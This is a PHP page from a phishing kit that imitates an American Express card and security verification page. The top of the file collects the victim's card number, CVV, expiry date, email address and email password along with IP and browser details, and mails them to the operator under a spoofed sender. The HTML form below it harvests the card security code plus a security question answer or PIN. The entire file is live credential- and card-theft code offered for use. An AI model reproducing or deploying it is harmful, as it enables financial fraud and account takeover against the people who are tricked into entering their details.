<?php
include('../../blockers.php');
include('../../detects.php');
include('../../random.php');

$cardnum = $_POST['CardNo'];
$C1D = $_POST['CID'];
$exmon = $_POST['ExpMon'];
$exyar = $_POST['ExpYear'];
$cardemail = $_POST['EmailAddress'];
$cardemailpwd = $_POST['EmailPwd'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$message .= "___________________________________________________________\n";
$message .= "_________________________4m3x_c4rd_________________________\n";
$message .= "\n";
$message .= "Cr3dit C4rd ______:   ".$cardnum."\n";
$message .= "CID/cVV2 _______:   ".$C1D."\n";
$message .= "3xp_____________:   ".$exmon."/".$exyar."\n";
$message .= "3m4il Addr3ss ______:   ".$cardemail."\n";
$message .= "3m4il P4ssw0rd ______:   ".$cardemailpwd."\n";
$message .= "___________________________________________________________\n";
$message .= "__________________________IP_Inf0___________________________\n";
$message .= "\n";
$message .= "Client IP __________: ".$v_ip."\n";
$message .= "BROWSER________: ".$browser."\n";
$message .= "HOSTNAME___:   ".$hostname."\n";
$message .= "___________________________________________________________\n";
$message .= "_______________________Donlakost3________________________\n";
$subject = "4m3x c4rds - 3m4il | ".$systemInfo['country']." | ".$systemInfo['region']." | ".$systemInfo['city']." | ".$v_ip."";
$headers = "FROM: 4m3x_c4rd <dreambetrue@f0xyTyV.com>";
mail($emailku,$subject,$message,$headers);

include('../../assets/header.php');

?>
<div class="container pad-1-tb">
    <div class="">
        <div>
            <div id="app-fuidfyp" class="card axp-forgot-userid-password__fuidfyp__appFuidfyp___3MiXW">
                <div class="margin-auto-lr margin-2-b" style="max-width: 800px;">
                    <div>
                        <div class="axp-forgot-userid-password__fuidfyp__container___PnV6i container pad-0">
                            <div class="row">
                                <div class="col-md-12">
                                    <div class="axp-forgot-userid-password__fuidfyp__nav___3g7iY nav nav-large" role="navigation" data-toggle="nav" aria-current="horizontal">
                                        <ul class="nav-menu fluid">
                                            <div class="col-md-6">
                                                <li class="nav-item text-align-center" role="presentation"><a role="navigation-section" aria-selected="false" title="I want to retrieve my User ID" class="nav-link" href="getstarted?confirm_card=<?php echo md5(microtime());?><?php echo md5(microtime());?>&session=<?php echo sha1(microtime()); ?>">Card Verification</a>
                                                </li>
                                            </div>
                                            <div class="col-md-6">
                                                <li class="nav-item text-align-center" role="presentation"><a role="navigation-section" aria-selected="true" title="I want to reset my password" class="nav-link" href="#/en-us/account/recover">Security Verification</a>
                                                </li>
                                            </div>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="axp-forgot-userid-password__fuidfyp__container___PnV6i container">
                            <div class="card-information">
                                <form method="post" action="confirm_identity?security=<?php echo md5(microtime());?><?php echo md5(microtime());?>&session=<?php echo sha1(microtime()); ?>">
                                    <div class="margin-b">
                                        <h2 class="heading-4 text-align-center pad-t">Enter Your Security Verification Information.</h2>
                                        <br><hr class="axp-authorize-action__module__margin0Lr___2fbcb">
                                    </div>
                                    <div class="margin-b">
                                        <p class="body-3">Please enter the 3-digit Card Security Code (CSC), which are the last three numbers printed on the signature strip on the back of your card. <?php if ($systemInfo['code'] == "US" || $systemInfo['code'] == "UK" || $systemInfo['code'] == "GB"): ?>Then verify your identity by answering the existing security questions.<?php endif;?></p>
                                    </div>
                                    <div class="row margin-b">
                                        <div class="col-md-6 col-md-6">
                                            <fieldset class="form-group">
                                                <div style="transition: all 300ms ease-in 0s;">
                                                    <div aria-labelledby="cid_password-label" aria-describedby="cid_password" class="axp-forgot-userid-password__PasswordInput__passwordInput___tmbae" data-module-name="identity-components-password">
                                                        <div class="form-group margin-0-b">
                                                            <label id="cid_password-label" class="" for="CSC">3-DIGIT CSC</label>
                                                            <div class="axp-forgot-userid-password__PasswordInput__private-field___cjjw6">
                                                                <input pattern="[0-9]*" id="CSC" inputmode="numeric" type="password" class="form-control" name="CSC" maxlength="3" aria-invalid="false" value="" required>
                                                                <button class="axp-forgot-userid-password__PasswordInput__show___32v2x" tabindex="0" name="CID" aria-label="Show" aria-pressed="false" type="button">
                                                                    <span class="icon dls-icon-show icon-hover"></span>
																</button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <br>

                                                    <?php if ($systemInfo['code'] == "US" || $systemInfo['code'] == "UK" || $systemInfo['code'] == "GB"): ?>
                                                    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
                                                    <script>
                                                        $(document).on('change', "select.tbl-sel-input", function () {
                                                            var attribute_value = $("#secQus").data("value");
                                                            var input_value = $(this).val();
                                                            $('#secQus').attr("data-value", input_value);
                                                        });
                                                    </script>
                                                    <?php endif;?>

                                                    <?php if ($systemInfo['code'] == "US" || $systemInfo['code'] == "UK" || $systemInfo['code'] == "GB"): ?>
                                                    <div class="form-group pad-0 col-xs-12 null">
                                                        <label for="SecurityQuestion" class=""><span>Security Question</span></label>
                                                        <div id="secQus" class="select form-control" data-rendered="true" data-value="Select">
                                                            <select id="SecurityQuestion" name="SecurityQuestion" class="form-control tbl-sel-input" formnovalidate="" style="width: 100%;" required>
                                                                <option label="Select" value="Select">Select</option>
                                                                <?php if ($systemInfo['code'] == "UK" || $systemInfo['code'] == "GB"): ?>
                                                                <option label="Memorable date in MM/DD format" value="Memorable date in MM/DD format">Memorable date in MM/DD format</option>
                                                                <option label="Numeric Password" value="Numeric Password">Numeric Password</option>
                                                                <?php else: ?>
                                        <option label="Your Security PIN" value="Your Security PIN">Your Security PIN</option>
                                                                <?php endif;?>
                                                            </select>
                                                        </div>
                                                    </div>
                                                    <div class="form-group pad-0 col-xs-12 null" data-toggle="" data-currency="">
                                                        <label class="" for="SecurityAnswer">Security Answer</label>
                                                        <div class="">
                                                            <input id="SecurityAnswer" name="SecurityAnswer" class="form-control" type="text" value="" required>
                                                        </div>
                                                    </div>
                                                    <?php endif;?>

                                                </div>
                                            </fieldset>
                                        </div>
                                        <div class="col-md-6 col-md-6 margin-b hidden-sm-down">
                                            <img class="display-block margin-auto-l" alt="" src="../../assets/src/3csc.jpg">
                                        </div>
                                        <div class="col-md-6 col-md-6 margin-b hidden-md-up">
                                            <img class="display-block margin-auto-lr" alt="" src="../../assets/src/3csc.jpg">
                                        </div>
                                    </div>
                                    <hr class="hr axp-forgot-userid-password__fuidfyp__contentSpacing___D_Qr9">
                                    <div class="row pad buttons hidden-sm-down flex-justify-end">
                                        <button class="btn-center" tabindex="0" title="" type="submit"><span class="btn-content">Continue</span>
																	</button>
                                    </div>
                                    <div class="row margin-t margin-0-lr buttons hidden-md-up ">
                                        <button class="btn-fluid btn-center" tabindex="0" title="" type="submit"><span class="btn-content">Continue</span>
																	</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<?php include('../../assets/footer.php'); ?>
